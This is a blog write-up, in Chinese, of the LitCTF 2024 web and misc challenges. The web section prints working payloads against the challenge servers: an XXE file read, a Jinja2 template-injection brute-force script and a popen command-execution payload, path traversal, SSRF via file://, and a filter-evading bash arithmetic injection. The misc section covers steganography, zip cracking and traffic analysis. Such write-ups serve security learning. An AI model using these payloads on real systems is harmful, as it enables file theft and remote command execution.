---
title: LitCTF 2024
description: web&misc wp
tags:
  - CTF
  - MISC
  - WEB
categories:
  - write up
cover: 'https://tuchuang.voooe.cn/images/2024/06/05/efa4c9e15a.png'
abbrlink: LitCTF2024
date: 2024-06-05 20:43:00
swiper_index: 5
---

## WEB

### exx

无过滤 xml 注入

```xml
<?xml version="1.0" encoding="UTF-8" ?>
<!DOCTYPE a [ 
<!ENTITY rabbit SYSTEM "file:///flag" >
]>
<user><username>&rabbit;</username><password>123</password></user>
```

![](https://s2.loli.net/2024/06/05/AQgYexBIkmqO89D.png)

### SAS - Serializing Authentication

入门级反序列化

```
<?php

class User {

    public $username;

    public $password;

    function __construct($username, $password) {

        $this->username = $username;

        $this->password = $password;

    }

    function isValid() { return $this->username === 'admin' && $this->password === 'secure_password'; }

}

?>
```

直接赋值账号密码即可通过检查，题目会对其 base64 解码，所以传入 base64 加密后的代码

exp：

```php
<?php
class User {
    public $username;
    public $password;
}
        $a=new User();
        $a->username="admin";
        $a->password="secure_password";
        echo base64_encode(serialize($a));
?>
# O:4:"User":2:{s:8:"username";s:5:"admin";s:8:"password";s:15:"secure_password";}
```

### 一个....池子？

![](https://s2.loli.net/2024/06/05/u2hOsoVa6L3QRAr.png)

尝试输入\{\{7*7\}\}回显了 49，证明存在 ssti 注入

`{{''.__class__.__base__.subclasses__()}}可以查询所有子类结果，这里用脚本爆破想要的函数`

```python
#post请求
import requests

headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36'
}

for i in range(501):
    url = "xxx"
    postPara = {"input":"{{\"\".__class__.__base__.__subclasses__()["+str(i)+"]}}"}
    print(i)
    res = requests.post(url=url,headers=headers,data=postPara)
    if 'os._wrap_close' in res.text: #查找其他命令时就用其他子类
        print("be founded in:"+str(i))
        break
else:
    print("not found")
# 得到编号为137
```

无过滤，直接拿 flag 即可

Payload:

`{{''.__class__.__bases__[0].__subclasses__()[137].__init__.__globals__['popen']('tac /flag').read()}}`

### 浏览器也能套娃？

ssrf，伪协议读取 flag

`file:///flag`

![](https://s2.loli.net/2024/06/05/uxGZVT7lds1n2z5.png)

### 高亮主题(划掉)背景查看器

```php
<?php

// 文件包含漏洞演示

if (isset($_GET['url'])) {

    // 读取并包含用户输入的文件

    $file = $_GET['url'];

    if (strpos($file, '..') === false) {

        include $file;

    } else {

        echo "Access denied.";

    }

} else {

    echo "No file specified.";

}

?>
```

无过滤文件包含，路径穿越直接读取

payload:

post：`theme=../../../../../../flag`

### 百万美元的诱惑

```php
<?php
error_reporting(0);

$a = $_GET['a'];
$b = $_GET['b'];

$c = $_GET['c'];

if ($a !== $b && md5($a) == md5($b)) {
        if (!is_numeric($c) && $c > 2024) {
            echo "好康的";
        } else {
            die("干巴爹干巴爹先辈~");
        }
    }
else {
    die("开胃小菜))");
}
```

abc 都可以采用数组绕过，payload：`?a[]=1&b[]=2&c[]=3`

拿到并访问 dollar.php，发现需要绕过过滤构造出 12

```php
<?php
//flag in 12.php
error_reporting(0);
if(isset($_GET['x'])){
    $x = $_GET['x'];
    if(!preg_match("/[a-z0-9;`|#'\"%&\x09\x0a><.,?*\-=\\[\]]/i", $x)){
            system("cat ".$x.".php");
    }
}else{
    highlight_file(__FILE__);
}
?>
```

在 linux 的终端中，输入$(())可以构造出0，再进行取反$((~$(())))就可以构造出-1，其原理是对其二进制取反，00000000->0 取反则变成 11111111->-1

我们再将两个-1 合在一起并取反则是 ~(-2)->1

即$((~$(($((~$(())))$((~$(())))))))

由此我们可以构造出任意的数字，这里的 12 可以是对-13 取反为 12，

也可以是-2 取反和-3 取反之后合并为 12，这里我使用后者

**预期 payload：**

```assembly
?x=$((~$(($(($((~$(())))$((~$(())))))))))$((~$(($((~$(())))$(($((~$(())))$((~$(())))))))))
```

> 题目描述已经把预期 paylaod 字符全给了，其他姿势就请自行搜索了 0.0

姬宝的好东西->[https://github.com/ProbiusOfficial/bashFuck](https://github.com/ProbiusOfficial/bashFuck)

## MISC

### 涐贪恋和伱、甾―⑺dé 毎兮毎秒

lsb 隐写最低位

![](https://s2.loli.net/2024/06/05/zkgOVWDn8GK5qvc.png)

### 你说的对，但__

拿到附件 binwalk 分离出多张图片

![](https://s2.loli.net/2024/06/05/kxKWbZJfSdOPva8.png)

![](https://s2.loli.net/2024/06/05/mbrKwZNzSIxlD71.png)

拼好扫描得到 flag

### The love

拿到一个图片和一个音频文件

图片 binwalk 分离出压缩包，文件名处得到 hint：Litctf??????ftclit

![](https://s2.loli.net/2024/06/05/OUFMitcgBxTAyKL.png)

6 位纯数字密码爆破，带上头尾即可

![](https://s2.loli.net/2024/06/05/gkV1ljPZXJvxmC7.png)

解压压缩包拿到假 flag 和一个 base64 加密的 password

![](https://s2.loli.net/2024/06/05/wG1nxfOMsoANqk7.png)

deepsound 解密得到真 flag

![](https://s2.loli.net/2024/06/05/Sh9ARPJHEflW3CU.png)

### 舔到最后应有尽有

base64 隐写，羊驼梭

![](https://s2.loli.net/2024/06/05/I9uEWT1az5Nr3Dp.png)

### 女装照流量

tcp.stream eq 28 拿到 flag.php 的加密压缩包

![](https://s2.loli.net/2024/06/05/oIf4T8rSgwM7cel.png)

随后在 tcp.stream eq 26 处找到密码

![](https://s2.loli.net/2024/06/05/ceqlJtHIYNPp23u.png)

最后两行删掉"参数名,&,="后 base64 解密

![](https://s2.loli.net/2024/06/05/2s7RlABv8kp6EhS.png)

解压后得到 flag

### Every Where We Go

flag 直接放在了频谱图里，使用 Adobe 的 AU 或者 audacity 等查看频谱图即可

![](https://s2.loli.net/2024/06/05/QEe9v2rGsCSaHc1.png)

### 盯帧珍珠

> 古有盯裆猫咪，今有盯帧珍珠

题目名及描述提示表明是 gif 图片并且要注意观察每一帧

也可以通过文件大小,文件头,file 命令等知道是 GIF 图片

先改后缀名为 GIF，后发现动画中有几帧的 flag 片段

使用 stegsolve,在线网站或脚本等逐帧提取对应 flag 片段图片，拼好 flag 即可

### 原铁，启动！

> 题目描述：这都是什么通用文字呢？

题目名称得到信息:  原神崩铁

题目描述得到信息：通用字体

搜索引擎开搜即可

[https://draugus.github.io/genshin/language](https://draugus.github.io/genshin/language)

提瓦特通用字体

[https://starrail.huijiwiki.com/wiki/%E6%96%87%E5%AD%97%E5%AF%B9%E7%85%A7%E8%A1%A8](https://starrail.huijiwiki.com/wiki/%E6%96%87%E5%AD%97%E5%AF%B9%E7%85%A7%E8%A1%A8)

崩铁宇宙通用文

### 关键，太关键了

> 题目描述：好像某些字符出现的频率很高哦

题目名称得到信息:  关键字加密

题目描述得到信息：字频统计

对 key.txt 的大量字符串进行字频统计得到 key:bingo

关键字解密 flag.txt 即可得到 flag
